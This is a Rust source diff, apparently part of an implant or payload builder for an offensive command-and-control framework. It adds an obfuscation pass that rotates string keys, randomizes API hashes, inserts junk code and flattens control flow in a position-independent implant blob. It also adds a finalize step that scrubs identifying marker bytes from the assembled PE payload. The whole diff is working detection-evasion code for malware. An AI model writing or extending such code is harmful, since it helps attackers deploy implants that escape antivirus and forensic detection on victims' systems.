@@ -156,6 +156,83 @@ pub fn obfuscate_blob(blob: &[u8], settings: &ObfuscationSettings) -> Result<Vec
     obfuscate(blob, settings).map(|r| r.blob)
 }
 
+/// Phase A: Apply marker-dependent transforms to the PIC blob BEFORE embedding
+/// into a PE stub. This rotates string keys, randomizes API hashes, inserts
+/// junk code, and applies CFF — but does NOT scrub markers or patch config
+/// magic, since the builder still needs those markers after embedding.
+///
+/// Call this on the raw PIC blob before `embed_pic_blob()`.
+pub fn apply_transforms(blob: &mut Vec<u8>, settings: &ObfuscationSettings) -> Result<(), ObfuscationError> {
+    if blob.len() < 16 {
+        return Ok(());
+    }
+
+    let mut rng = rand::thread_rng();
+
+    // Each transform is best-effort: if the corresponding marker is not present
+    // in the PIC blob (e.g., the implant was compiled without that feature),
+    // we skip the transform rather than failing the entire build.
+    if settings.string_encryption {
+        match rotate_string_key(blob, &mut rng) {
+            Ok(()) => {}
+            Err(ObfuscationError::MarkerNotFound(_)) => {
+                tracing::debug!("SPECSTR marker not found; skipping string key rotation");
+            }
+            Err(e) => return Err(e),
+        }
+    }
+    if settings.api_hash_randomization {
+        match randomize_api_hashes(blob, &mut rng) {
+            Ok(()) => {}
+            Err(ObfuscationError::MarkerNotFound(_)) => {
+                tracing::debug!("SPECHASH marker not found; skipping API hash randomization");
+            }
+            Err(e) => return Err(e),
+        }
+    }
+    if settings.junk_code_insertion {
+        let new_blob = insert_junk_code(blob, settings.junk_density, &mut rng);
+        *blob = new_blob;
+    }
+    if settings.control_flow_flattening {
+        match apply_control_flow_flattening(blob, &mut rng) {
+            Ok(()) => {}
+            Err(ObfuscationError::MarkerNotFound(_)) => {
+                tracing::debug!("SPECFLOW marker not found; skipping CFF");
+            }
+            Err(e) => return Err(e),
+        }
+    }
+
+    Ok(())
+}
+
+/// Phase B: Scrub all remaining SPEC* markers and the SPBF marker from the
+/// final assembled payload (after config magic patching and build flags
+/// patching are complete). This must be the LAST step before optional XOR
+/// encryption.
+///
+/// Call this on the fully assembled payload (PE stub + embedded PIC + config).
+pub fn finalize_payload(payload: &mut [u8]) {
+    let mut rng = rand::thread_rng();
+
+    // Scrub all SPEC* markers (SPECSTR, SPECHASH, SPECCFGM prefix, SPECMGRD,
+    // SPECHEAP, SPECFLOW) and old CONFIG_MAGIC occurrences.
+    scrub_markers(payload, &mut rng);
+
+    // Also scrub SPBF marker if still present (e.g. when patch_build_flags
+    // was not called or the marker was duplicated).
+    if let Some(pos) = find_marker(payload, BUILD_FLAGS_MARKER) {
+        fill_random(&mut payload[pos..pos + BUILD_FLAGS_MARKER.len()], &mut rng);
+    }
+
+    // Scrub SPECPICBLOB marker if present in the final payload
+    const PIC_MARKER: &[u8; 12] = b"SPECPICBLOB\x00";
+    if let Some(pos) = find_marker(payload, PIC_MARKER) {
+        fill_random(&mut payload[pos..pos + PIC_MARKER.len()], &mut rng);
+    }
+}
+
 // ---------------------------------------------------------------------------
 // 1. String encryption key rotation
 // ---------------------------------------------------------------------------
